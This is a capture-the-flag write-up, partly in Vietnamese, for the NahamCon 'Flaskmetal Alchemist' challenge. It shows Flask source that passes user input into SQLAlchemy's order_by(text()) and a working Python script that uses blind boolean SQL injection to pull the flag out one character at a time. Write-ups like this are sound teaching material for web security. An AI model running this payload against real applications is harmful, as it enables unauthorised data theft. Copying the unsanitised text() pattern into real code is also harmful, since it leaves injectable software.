# nahamcon CTF - Flaskmetal Alchemist

SQL injection SQLAlchemy via text() function

## Description
Edward has decided to get into web development, and he built this awesome application that lets you search for any metal you want. Alphonse has some reservations though, so he wants you to check it out and make sure it's legit.

Source-code: `fma.zip`

## Solution

### Review

![1](https://user-images.githubusercontent.com/71699412/167264396-56409af9-a175-439e-996a-28cc39964199.jpg)


Chall cho 1 website có thể tra cứu các nguyên tố hóa học cùng với thanh tìm kiếm, thanh này còn có thêm order by để sắp xếp kết quả trả về theo thứ tự như Name, Symbol hay Atomic Number.

Source-code: `app.py`
```python
from flask import Flask, render_template, request, url_for, redirect
from models import Metal
from database import db_session, init_db
from seed import seed_db
from sqlalchemy import text

app = Flask(__name__)


@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)


if __name__ == "__main__":
    seed_db()
    app.run(debug=False)

```
Nhìn kĩ ta thấy điều bất thường là khi ta có sử dụng `order` param, query sẽ gồm method `.order_by()` pass hàm `text()` chứa param `order`. Qua tìm hiểu, hàm `text()` trong `sqlalchemy` là hàm thực hiện truy vấn nhận argument là 1 query string như các hệ SQL phổ biến khác thay vì cấu trúc như thường của nó là dùng `object-relational mapping(ORM)`, tức query bằng cách gọi các `object`, phù hợp cho lập trình hướng đối tượng.

Tham khảo: https://www.tutorialspoint.com/sqlalchemy/sqlalchemy_core_using_textual_sql.htm#:~:text=SQLAlchemy%20lets%20you%20just%20use,to%20the%20database%20mostly%20unchanged

Như bạn đã biết, exploit SQLi bằng `order by` này không thể tấn công bằng `union attack` nên ta nhận định đây là dạng SQL injection boolen based via order by.
### Exploit

Ta tạo python script brute force thôi:

```python
import requests
import string

url = 'http://challenge.nahamcon.com:32714/'
characters = '_' + string.ascii_lowercase + string.digits + '}'

flag = 'flag{'
for i in range(30):
	for c in characters:
		data = {
			'search': '',
			'order': f'(SELECT CASE WHEN (select SUBSTR(flag,{len(flag)+1},1) from flag limit 1)="{c}" THEN "name" ELSE "atomic_number" END)'
		}

		r = requests.post(url, data=data)
		print('[-] - trying: ' + c)
		if '89' in r.text[2575:2544+137]:
			flag += c
			print('[+] - found: ' + flag)
			break

# name: Atomic Number: 89
# atomic_number: 3 
```

Ta ghép sql IF statement vào, thử điều kiện đúng sai trả về order by name/atomic_number, từ thứ tự khác biệt trả về, ta có thể brute force ra flag.

![Screenshot 2022-05-08 000216](https://user-images.githubusercontent.com/71699412/167264435-228c9758-0903-4ce7-be95-a1a4f842558e.jpg)

**Flag**: `flag{order_by_blind}`
